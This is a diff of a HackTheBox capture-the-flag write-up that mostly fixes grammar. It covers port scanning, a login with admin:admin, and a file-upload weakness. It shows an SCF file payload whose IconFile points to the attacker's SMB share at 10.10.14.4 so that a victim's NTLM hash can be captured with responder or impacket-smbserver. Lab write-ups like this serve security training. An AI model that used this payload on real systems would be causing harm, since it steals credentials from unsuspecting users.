@@ -48,19 +48,19 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 135.39 seconds
 ```
 
-Using nmap, we identified there are 4 ports open, 80, 135 (msrpc service), 445 (smb service), and 5985. Port 5985 (WinRM service) should be our interest here. Anyway since it runs a webapp, i succeed login using `admin:admin`.
+Using nmap, we identified that there are 4 ports open: 80, 135 (MSRPC service), 445 (SMB service), and 5985. Port 5985 (WinRM service) should be of interest here. Anyway, since it runs a webapp, I succeeded in logging in using `admin:admin`.
 
 > RESULT
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7b3e6987-30f9-4f12-8881-64b73201c8c7)
 
 
-Seems the vuln is at the file upload feature, because it does not check the uploaded file, the file itself shall reviewed manually later by the testing team.
+It seems the vulnerability is in the file upload feature because it does not check the uploaded file; the file itself shall be reviewed manually later by the testing team.
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a69f817c-0ea2-4196-996c-41501be82cec)
 
 
-Remembering the OS used is windows, hence we can upload Shell Command File (SCF) that can makes a connection back to our local machine using SMB (remembering the file is uploaded to a SMB share). With this we can grab the NTLM Hash.
+Remembering that the OS used is Windows,  we can upload a Shell Command File (SCF) that can make a connection back to our local machine using SMB (remembering the file is uploaded to a SMB share). With this, we can grab the NTLM Hash.
 
 #### NOTES:
 
@@ -83,3 +83,4 @@ IconFile=\\10.10.14.4\tools\nc.ico
 Command=ToggleDesktop
 ```
 
+To capture the NTLM hash, we can either using **responder** or **impacket-smbserver**. 
